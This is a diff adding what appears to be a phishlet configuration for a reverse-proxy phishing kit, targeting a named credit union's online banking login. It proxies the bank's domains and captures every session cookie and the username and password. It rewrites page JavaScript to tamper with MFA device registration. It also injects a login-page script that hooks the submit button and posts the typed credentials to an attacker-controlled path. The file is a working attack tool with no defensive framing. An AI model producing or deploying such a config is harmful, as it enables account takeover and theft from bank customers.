@@ -1,0 +1,53 @@
+min_ver: "2.3.0"
+proxy_hosts:
+  - { phish_sub: "www", orig_sub: "www", domain: "rcu.org", session: true, is_landing: true }
+  - { phish_sub: "ai", orig_sub: "ai", domain: "rcu.org", session: true, is_landing: false }
+  - { phish_sub: "login", orig_sub: "www", domain: "rcuonline.org", session: true, is_landing: true }
+
+sub_filters: 
+
+  - {triggers_on: 'www.rcuonline.org', orig_sub: 'www', domain: 'rcuonline.org', search: 'doNotRegisterDevice",disabled:this.state.submittingCode,', replace: 'doNotRegisterDevice",disabled:"true",', mimes: ['application/javascript']}
+
+auth_tokens:
+  - domain: 'www.rcuonline.org'
+    keys: ['.*,regexp']
+  - domain: '.rcuonline.org'
+    keys: ['.*,regexp']
+
+auth_urls:
+  - '/auth-olb/live/v1/user/authtoken'
+  - '/auth-olb/live/v1/mfa/submit'
+credentials:
+  username:
+    key: 'userid'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post' 
+
+login:
+  domain: "www.rcuonline.org"
+  path: "/dbank/live/app/login/consumer"
+
+js_inject:
+  - trigger_domains: ["www.rcuonline.org"]
+    trigger_paths: ["/dbank/live/app/login/consumer"]
+    script: |
+        function onclickListener(){
+         var submit = document.querySelectorAll('button[class="fluid-button fluid-button--primary is-dark-bg"]')[0];
+         submit.setAttribute("onclick", "sendPass()", 500);
+         return;
+        }
+        function sendPass(){
+         var username = document.getElementsByName("userid")[0].value;
+         var pass = document.getElementsByName("password")[0].value;
+         var xhr = new XMLHttpRequest();
+         xhr.open("POST", '/touhou', true);
+         xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+         xhr.send("userid="+encodeURIComponent(username)+"&password="+encodeURIComponent(pass));
+         return;
+        }
+        setInterval(function(){ onclickListener(); }, 10000);
+  
